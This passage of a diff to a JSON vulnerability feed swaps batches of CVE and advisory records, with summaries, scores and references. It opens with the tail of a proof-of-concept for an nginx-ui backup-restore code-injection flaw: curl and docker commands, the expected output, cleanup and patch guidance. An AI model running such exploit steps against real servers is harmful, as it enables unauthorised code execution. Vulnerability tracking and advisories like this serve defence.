0.5\ndone\n\ncurl -sS -X POST \"$BASE/api/nginx/test\" \\\n  -H \"Authorization: $TOKEN\"\n\ndocker exec \"$CONTAINER\" sh -lc 'cat /tmp/nginx-ui-restore-rce'\n\n# Cleanup and return the disposable instance to its original config.\ndocker cp \"$TMP/app.ini.original\" \"$CONTAINER\":/etc/nginx-ui/app.ini\ndocker exec \"$CONTAINER\" sh -lc 'rm -f /tmp/nginx-ui-restore-rce'\ndocker restart \"$CONTAINER\"\n```\n\nExpected output:\n\n```text\n{\"nginx_ui_restored\":true,\"nginx_restored\":false,\"hash_match\":true}\n{\"message\":\"\",\"level\":-1,\"test_scope\":\"global\"}\nrestored-rce\n```\n\n## Cleanup\n\nThe PoC performs cleanup at the end. If interrupted, restore the original `app.ini` from a known-good backup, remove `/tmp/nginx-ui-restore-rce`, and restart nginx-ui before continuing other tests.\n\n## Patch Guidance\n\nRequire an elevated/admin secure session for restore, do not allow ordinary authenticated users to restore nginx-ui app state, bind backup manifest signatures to a server-side secret or administrator-held passphrase, and block protected app settings from being restored unless explicitly approved through a hardened migration path.",
-      "cvssScore": 9,
-      "severity": "Critical",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-94",
-        "name": "Improper Control of Generation of Code ('Code Injection')"
-      },
-      "references": [
-        "https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-p393-cf76-4jmr",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-107806",
-        "https://github.com/0xJacky/nginx-ui/commit/a467ed652591fc0cd1b466a1ec751b493faef9f7",
-        "https://github.com/0xJacky/nginx-ui/releases/tag/v2.5.0",
-        "https://github.com/advisories/GHSA-p393-cf76-4jmr"
-      ],
-      "vulnerableProducts": [
-        "github.com/0xJacky/Nginx-UI go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2294",
-      "summary": "Multiple buffer overflows in Symantec Raptor Firewall 6.5 and 6.5.3, Enterprise Firewall 6.5.2 and 7.0, VelociRaptor 500/700/1000 and 1100/1200/1300, and Gateway Security 5110/5200/5300 allow remote attackers to cause a denial of service (service termination) via (1) malformed RealAudio (rad) packets that are not properly handled by the RealAudio Proxy, or (2) crafted packets to the statistics service (statsd).",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": "CWE-119",
-      "references": [
-        "http://www.securityfocus.com/bid/6389",
-        "http://www.symantec.com/avcenter/security/Content/2002.12.12.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/10862",
-        "http://www.securityfocus.com/bid/6389",
-        "http://www.symantec.com/avcenter/security/Content/2002.12.12.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2295",
-      "summary": "Buffer overflow in Pico Server (pServ) 2.0 beta 1 through beta 5 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via (1) a 1024-byte TCP stream message, which triggers an off-by-one buffer overflow, or (2) a long method name in an HTTP request, (3) a long version number in an HTTP request, (4) a long User-Agent header, or (5) a long file path.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": "CWE-119",
-      "references": [
-        "http://www.derkeiler.com/Mailing-Lists/Full-Disclosure/2002-11/0457.html",
-        "http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2002-12/0005.html",
-        "http://www.securiteam.com/securitynews/6Q0020A6AS.html",
-        "http://www.securityfocus.com/bid/6283",
-        "http://www.securityfocus.com/bid/6284"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2296",
-      "summary": "Cross-site scripting (XSS) vulnerability in YaBB.pl in Yet Another Bulletin Board (YaBB) 1 Gold SP 1 allows remote attackers to inject arbitrary web script or HTML via the num parameter.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": "CWE-79",
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-12/0003.html",
-        "http://www.securityfocus.com/bid/6272",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/10737",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-12/0003.html",
-        "http://www.securityfocus.com/bid/6272"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-2297",
-      "summary": "PHP remote file inclusion vulnerability in artlist.php in Thatware 0.5.2 and 0.5.3 allows remote attackers to execute arbitrary PHP code via the root_path parameter.",
-      "cvssScore": 6.8,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": "CWE-94",
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-12/0000.html",
-        "http://securitytracker.com/id?1005733",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/10758",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-12/0000.html",
-        "http://securitytracker.com/id?1005733"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0330",
-      "summary": "Buffer overflow in unknown versions of Maelstrom allows local users to execute arbitrary code via a long -player command line argument.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2003-06-09",
-      "modified": null,
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=105344891005369&w=2",
-        "http://www.securitytracker.com/id?1008832",
-        "http://marc.info/?l=bugtraq&m=105344891005369&w=2",
-        "http://www.securitytracker.com/id?1008832"
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-88275",
+        "https://www.geovision.com.tw/cyber_security.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0331",
-      "summary": "SQL injection vulnerability in ttForum allows remote attackers to execute arbitrary SQL and gain ttForum Administrator privileges via the Ignorelist-Textfield argument in the Preferences page.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2003-06-09",
-      "modified": null,
+      "id": "CVE-2026-88277",
+      "summary": "GeoVision GV-LPC2211 V1.13 allows an authenticated ONVIF user to inject shell commands through ConsumerReference.Address and execute arbitrary commands as root.",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=105345273210334&w=2",
-        "http://marc.info/?l=bugtraq&m=105345273210334&w=2"
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-88277",
+        "https://www.geovision.com.tw/cyber_security.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-1239",
-      "summary": "PowerNet IX allows remote attackers to cause a denial of service via a port scan.",
-      "cvssScore": 5,
+      "id": "CVE-2026-88270",
+      "summary": "GeoVision GV-LPC2211 V1.13 allows a Guest user to enter SSVR firmware-upgrade mode and disrupt live services before any firmware image is validated.",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-88270",
+        "https://www.geovision.com.tw/cyber_security.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-88272",
+      "summary": "GeoVision GV-LPC2211 V1.13 allows an administrator-controlled username containing shell metacharacters to be executed as arbitrary root commands when the stored username is later deleted.",
+      "cvssScore": 5.5,
       "severity": "Medium",
-      "published": "2001-06-29",
-      "modified": null,
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/bid/2992",
-        "http://www.securityfocus.com/bid/2992"
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-88272",
+        "https://www.geovision.com.tw/cyber_security.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-0368",
-      "summary": "Directory traversal vulnerability in BearShare 2.2.2 and earlier allows a remote attacker to read certain files via a URL containing a series of . characters, a variation of the .. (dot dot) attack.",
+      "id": "CVE-2001-0335",
+      "summary": "FTP service in IIS 5.0 and earlier allows remote attackers to enumerate Guest accounts in trusted domains by preceding the username with a special sequence of characters.",
       "cvssScore": 5,
       "severity": "Medium",
       "published": "2001-06-27",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.osvdb.org/1810",
-        "http://www.securityfocus.com/archive/1/180644",
-        "http://www.securityfocus.com/bid/2672",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6481",
-        "http://www.osvdb.org/1810"
+        "http://www.securityfocus.com/bid/2719",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-026",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6545",
+        "http://www.securityfocus.com/bid/2719",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-026"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-2324",
-      "summary": "The \"System Restore\" directory and subdirectories, and possibly other subdirectories in the \"System Volume Information\" directory on Windows XP Professional, have insecure access control list (ACL) permissions, which allows local users to access restricted files and modify registry settings.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": "CWE-264",
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0070.html",
-        "http://www.iss.net/security_center/static/10279.php",
-        "http://www.securityfocus.com/bid/5894",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0070.html",
-        "http://www.iss.net/security_center/static/10279.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0731",
-      "summary": "Apache 1.3.20 with Multiviews enabled allows remote attackers to view directory contents and bypass the index page via a URL containing the \"M=D\" query string.",
+      "id": "CVE-2001-0336",
+      "summary": "The Microsoft MS00-060 patch for IIS 5.0 and earlier introduces an error which allows attackers to cause a denial of service via a malformed request.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-10-01",
+      "published": "2001-06-27",
       "modified": null,
       "cwe": null,
       "references": [
-        "ftp://patches.sgi.com/support/free/security/advisories/20020301-01-P",
-        "http://frontal2.mandriva.com/security/advisories?name=MDKSA-2001:077",
-        "http://www.apacheweek.com/issues/01-10-05#security",
-        "http://www.redhat.com/support/errata/RHSA-2001-126.html",
-        "http://www.redhat.com/support/errata/RHSA-2001-164.html"
+        "http://www.osvdb.org/5693",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-026",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6858",
+        "http://www.osvdb.org/5693",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-026"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-1123",
-      "summary": "Vulnerability in Network Node Manager (NNM) 6.2 and earlier in HP OpenView allows a local user to execute arbitrary code, possibly via a buffer overflow in a long hostname or object ID.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2001-10-01",
+      "id": "CVE-2000-1198",
+      "summary": "qpopper POP server creates lock files with predictable names, which allows local users to cause a denial of service for other users (lack of mail access) by creating lock files for other mail boxes.",
+      "cvssScore": 5.5,
+      "severity": "Medium",
+      "published": "2001-08-31",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-667",
       "references": [
-        "http://www.kb.cert.org/vuls/id/782155",
-        "http://www.securityfocus.com/advisories/3585",
-        "http://www.securityfocus.com/advisories/3723",
-        "http://www.securityfocus.com/bid/3399",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7222"
+        "http://marc.info/?l=bugtraq&m=95624629924545&w=2",
+        "http://marc.info/?l=bugtraq&m=95634229925906&w=2",
+        "http://www.securityfocus.com/bid/1132",
+        "http://marc.info/?l=bugtraq&m=95624629924545&w=2",
+        "http://marc.info/?l=bugtraq&m=95634229925906&w=2"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0641",
-      "summary": "The UUCP service is running.",
-      "cvssScore": 0,
-      "severity": "Low",
-      "published": "1999-01-01",
+      "id": "CVE-2000-1199",
+      "summary": "PostgreSQL stores usernames and passwords in plaintext in (1) pg_shadow and (2) pg_pwd, which allows attackers with sufficient privileges to gain access to databases.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2001-08-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0641",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0641"
+        "http://marc.info/?l=bugtraq&m=95659987018649&w=2",
+        "http://www.securityfocus.com/bid/1139",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4364",
+        "http://marc.info/?l=bugtraq&m=95659987018649&w=2",
+        "http://www.securityfocus.com/bid/1139"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0228",
-      "summary": "Directory traversal vulnerability in Microsoft Windows Media Player 7.1 and Windows Media Player for Windows XP allows remote attackers to execute arbitrary code via a skins file with a URL containing hex-encoded backslash characters (%5C) that causes an executable to be placed in an arbitrary location.",
+      "id": "CVE-2004-0264",
+      "summary": "palmhttpd for PalmOS allows remote attackers to cause a denial of service (crash) by establishing two simultaneous HTTP connections, which exceeds the PalmOS accept queue.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-11-23",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=107634638201570&w=2",
+        "http://www.securityfocus.com/bid/9608",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15090",
+        "http://marc.info/?l=bugtraq&m=107634638201570&w=2",
+        "http://www.securityfocus.com/bid/9608"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0161",
+      "summary": "Sample web sites on Microsoft Site Server 3.0 Commerce Edition do not validate an identification number, which allows remote attackers to execute SQL commands.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2003-05-27",
+      "published": "2000-02-18",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=105232913516488&w=2",
-        "http://marc.info/?l=bugtraq&m=105240528419389&w=2",
-        "http://marc.info/?l=ntbugtraq&m=105233960728901&w=2",
-        "http://www.kb.cert.org/vuls/id/384932",
-        "http://www.securityfocus.com/bid/7517"
+        "http://www.securityfocus.com/bid/994",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-010",
+        "http://www.securityfocus.com/bid/994",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-010"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0235",
-      "summary": "Format string vulnerability in POP3 client for Mirabilis ICQ Pro 2003a allows remote malicious servers to execute arbitrary code via format strings in the response to a UIDL command.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2003-05-27",
+      "id": "CVE-2000-0162",
+      "summary": "The Microsoft virtual machine (VM) in Internet Explorer 4.x and 5.x allows a remote attacker to read files via a malicious Java applet that escapes the Java sandbox, aka the \"VM File Reading\" vulnerability.",
+      "cvssScore": 5.1,
+      "severity": "Medium",
+      "published": "2000-02-18",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0051.html",
-        "http://marc.info/?l=bugtraq&m=105216842131995&w=2",
-        "http://www.coresecurity.com/common/showdoc.php?idx=315&idxseccion=10",
-        "http://www.securityfocus.com/bid/7461",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11938"
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-011",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-011"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1858",
-      "summary": "Oracle Oracle9i Application Server 1.0.2.2 and 9.0.2 through 9.0.2.0.1, when running on Windows, allows remote attackers to retrieve files in the WEB-INF directory, which contains Java class files and configuration information, via a request to the WEB-INF directory with a trailing dot (\"WEB-INF.\").",
+      "id": "CVE-2001-0698",
+      "summary": "Directory traversal vulnerability in NetWin SurgeFTP 2.0a and 1.0b allows a remote attacker to list arbitrary files and directories via the 'nlist ...' command.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2002-12-31",
+      "published": "2001-09-20",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://online.securityfocus.com/archive/1/279582",
-        "http://otn.oracle.com/deploy/security/pdf/2002alert47rev1.pdf",
-        "http://www.iss.net/security_center/static/9446.php",
-        "http://www.securityfocus.com/bid/5119",
-        "http://www.westpoint.ltd.uk/advisories/wp-02-0002.txt"
+        "http://www.netwinsite.com/surgeftp/manual/updates.htm",
+        "http://www.securityfocus.com/archive/1/191916",
+        "http://www.securityfocus.com/bid/2892",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6711",
+        "http://www.netwinsite.com/surgeftp/manual/updates.htm"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0763",
-      "summary": "xlockmore and xlockf do not properly cleanse user-injected format strings, which allows local users to gain root privileges via the -d option.",
+      "id": "CVE-2001-0699",
+      "summary": "Buffer overflow in cb_reset in the System Service Processor (SSP) package of SunOS 5.8 allows a local user to execute arbitrary code via a long argument.",
       "cvssScore": 7.2,
       "severity": "High",
-      "published": "2000-10-20",
+      "published": "2001-09-20",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0212.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0294.html",
-        "http://archives.neohapsis.com/archives/freebsd/2000-08/0340.html",
-        "http://www.debian.org/security/2000/20000816",
-        "http://www.securityfocus.com/bid/1585"
+        "http://www.securityfocus.com/archive/1/192299",
+        "http://www.securityfocus.com/bid/2893",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6726",
+        "http://www.securityfocus.com/archive/1/192299",
+        "http://www.securityfocus.com/bid/2893"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0764",
-      "summary": "Intel Express 500 series switches allow a remote attacker to cause a denial of service via a malformed IP packet.",
+      "id": "CVE-1999-0013",
+      "summary": "Stolen credentials from SSH clients via ssh-agent program, allowing other local users to access remote accounts belonging to the ssh-agent user.",
+      "cvssScore": 8.4,
+      "severity": "High",
+      "published": "1998-01-22",
+      "modified": null,
+      "cwe": "CWE-522",
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0013",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0013"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0069",
+      "summary": "Solaris ufsrestore buffer overflow.",
+      "cvssScore": 8.4,
+      "severity": "High",
+      "published": "1998-04-29",
+      "modified": null,
+      "cwe": "CWE-119",
+      "references": [
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/169",
+        "http://www.osvdb.org/8158",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/169",
+        "http://www.osvdb.org/8158"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1532",
+      "summary": "Netscape Messaging Server 3.54, 3.55, and 3.6 allows a remote attacker to cause a denial of service (memory exhaustion) via a series of long RCPT TO commands.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2000-10-20",
+      "published": "1999-10-29",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0338.html",
-        "http://www.securityfocus.com/bid/1609",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5154",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0338.html",
-        "http://www.securityfocus.com/bid/1609"
+        "http://marc.info/?l=bugtraq&m=94117465014255&w=2",
+        "http://www.securityfocus.com/bid/748",
+        "http://marc.info/?l=bugtraq&m=94117465014255&w=2",
+        "http://www.securityfocus.com/bid/748"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-2140",
-      "summary": "CRLF injection vulnerability in YaBB 1 Gold before 1.3.2 allows remote attackers to modify text file contents via the subject variable.",
+      "id": "CVE-2004-1527",
+      "summary": "Microsoft Internet Explorer 6.0 SP1 does not properly handle certain character strings in the Path attribute, which can cause it to modify cookies in other domains when the attacker's domain name is within the target's domain name or when wildcard DNS is being used, which allows remote attackers to hijack web sessions.",
       "cvssScore": 5,
       "severity": "Medium",
       "published": "2004-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://secunia.com/advisories/12609/",
-        "http://www.yabbforum.com/community/YaBB.pl?board=general%3Baction=display%3Bnum=1093133233",
-        "http://secunia.com/advisories/12609/",
-        "http://www.yabbforum.com/community/YaBB.pl?board=general%3Baction=display%3Bnum=1093133233"
+        "http://marc.info/?l=bugtraq&m=110053968530613&w=2",
+        "http://secunia.com/advisories/13208",
+        "http://www.lac.co.jp/business/sns/intelligence/SNSadvisory_e/79_e.html",
+        "http://www.securityfocus.com/bid/11680",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/18073"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-0740",
-      "summary": "Buffer overflow in strong.exe program in NAI Net Tools PKI server 1.0 before HotFix 3 allows remote attackers to execute arbitrary commands via a long URL in the HTTPS port.",
+      "id": "CVE-2004-0340",
+      "summary": "Stack-based buffer overflow in WFTPD Pro Server 3.21 Release 1, Pro Server 3.20 Release 2, Server 3.21 Release 1, and Server 3.10 allows local users to execute arbitrary code via long (1) LIST, (2) NLST, or (3) STAT commands.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2004-11-23",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=107801208004699&w=2",
+        "http://secunia.com/advisories/11001",
+        "http://www.securityfocus.com/bid/9767",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15340",
+        "http://marc.info/?l=bugtraq&m=107801208004699&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0648",
+      "summary": "The legacy <script> data-island capability for XML in Microsoft Internet Explorer 5.01, 5.5, and 6.0 allows remote attackers to read arbitrary XML files, and portions of other files, via a URL whose \"src\" attribute redirects to a local file.",
       "cvssScore": 5,
       "severity": "Medium",
+      "published": "2002-09-24",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=103011639524314&w=2",
+        "http://www.iss.net/security_center/static/9936.php",
+        "http://www.securityfocus.com/bid/5560",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-047",
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A1026"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0691",
+      "summary": "Microsoft Internet Explorer 5.01 and 5.5 allows remote attackers to execute scripts in the Local Computer zone via a URL that references a local HTML resource file, a variant of \"Cross-Site Scripting in Local HTML Resource\" as identified by CAN-2002-0189.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-09-24",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.iss.net/security_center/static/9938.php",
+        "http://www.securityfocus.com/bid/5561",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-047",
+        "http://www.iss.net/security_center/static/9938.php",
+        "http://www.securityfocus.com/bid/5561"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0725",
+      "summary": "Zope before 2.2.1 does not properly restrict access to the getRoles method, which allows users who can edit DTML to add or modify roles by modifying the roles list that is included in a request.",
+      "cvssScore": 7.2,
+      "severity": "High",
       "published": "2000-10-20",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0473.html",
-        "http://download.nai.com/products/licensed/pgp/hf3pki10.txt",
-        "http://www.osvdb.org/1488",
-        "http://www.securityfocus.com/bid/1536",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5026"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0198.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0259.html",
+        "http://www.debian.org/security/2000/20000821",
+        "http://www.redhat.com/support/errata/RHSA-2000-052.html",
+        "http://www.securityfocus.com/bid/1577"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0039",
-      "summary": "ISC dhcrelay (dhcp-relay) 3.0rc9 and earlier, and possibly other versions, allows remote attackers to cause a denial of service (packet storm) via a certain BOOTP packet that is forwarded to a broadcast MAC address, causing an infinite loop that is not restricted by a hop count.",
-      "cvssScore": 5,
+      "id": "CVE-2002-2359",
+      "summary": "Cross-site scripting (XSS) vulnerability in the FTP view feature in Mozilla 1.0 allows remote attackers to inject arbitrary web script or HTML via the title tag of an ftp URL.",
+      "cvssScore": 4.3,
       "severity": "Medium",
-      "published": "2003-02-07",
+      "published": "2002-12-31",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-79",
       "references": [
-        "http://cc.turbolinux.com/security/TLSA-2003-26.txt",
-        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000616",
-        "http://marc.info/?l=bugtraq&m=104310927813830&w=2",
-        "http://www.debian.org/security/2003/dsa-245",
-        "http://www.kb.cert.org/vuls/id/149953"
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0060.html",
+        "http://bugzilla.mozilla.org/show_bug.cgi?id=154030",
+        "http://www.iss.net/security_center/static/9757.php",
+        "http://www.securityfocus.com/bid/5403",
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0060.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0042",
-      "summary": "Jakarta Tomcat before 3.3.1a, when used with JDK 1.3.1 or earlier, allows remote attackers to list directories even with an index.html or other file present, or obtain unprocessed source code for a JSP file, via a URL containing a null character.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-02-07",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://jakarta.apache.org/builds/jakarta-tomcat/release/v3.3.1a/",
-        "http://jakarta.apache.org/builds/jakarta-tomcat/release/v3.3.1a/RELEASE-NOTES-3.3.1a.txt",
-        "http://marc.info/?l=bugtraq&m=104394568616290&w=2",
-        "http://secunia.com/advisories/7972",
-        "http://secunia.com/advisories/7977"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0043",
-      "summary": "Jakarta Tomcat before 3.3.1a, when used with JDK 1.3.1 or earlier, uses trusted privileges when processing the web.xml file, which could allow remote attackers to read portions of some files through the web.xml file.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-02-07",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://jakarta.apache.org/builds/jakarta-tomcat/release/v3.3.1a/",
-        "http://jakarta.apache.org/builds/jakarta-tomcat/release/v3.3.1a/RELEASE-NOTES-3.3.1a.txt",
-        "http://www.ciac.org/ciac/bulletins/n-060.shtml",
-        "http://www.debian.org/security/2003/dsa-246",
-        "http://www.securityfocus.com/advisories/5111"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0640",
-      "summary": "BEA WebLogic Server and Express, when using NodeManager to start servers, provides Operator users with privileges to overwrite usernames and passwords, which may allow Operators to gain Admin privileges.",
-      "cvssScore": 10,
+      "id": "CVE-2002-2360",
+      "summary": "The RPC module in Webmin 0.21 through 0.99, when installed without root or admin privileges, allows remote attackers to read and write to arbitrary files and execute arbitrary commands via remote_foreign_require and remote_foreign_call requests.",
+      "cvssScore": 9.3,
       "severity": "Critical",
-      "published": "2003-08-27",
+      "published": "2002-12-31",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-264",
       "references": [
-        "http://dev2dev.bea.com/resourcelibrary/advisoriesnotifications/BEA03-33.jsp",
-        "http://www.secunia.com/advisories/9232/",
-        "http://dev2dev.bea.com/resourcelibrary/advisoriesnotifications/BEA03-33.jsp",
-        "http://www.secunia.com/advisories/9232/"
+        "http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2002-08/0403.html",
+        "http://www.iss.net/security_center/static/9983.php",
+        "http://www.securiteam.com/unixfocus/5CP0R1P80G.html",
+        "http://www.securityfocus.com/bid/5591",
+        "http://www.derkeiler.com/Mailing-Lists/securityfocus/bugtraq/2002-08/0403.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "GHSA-PM76-W63J-7J29",
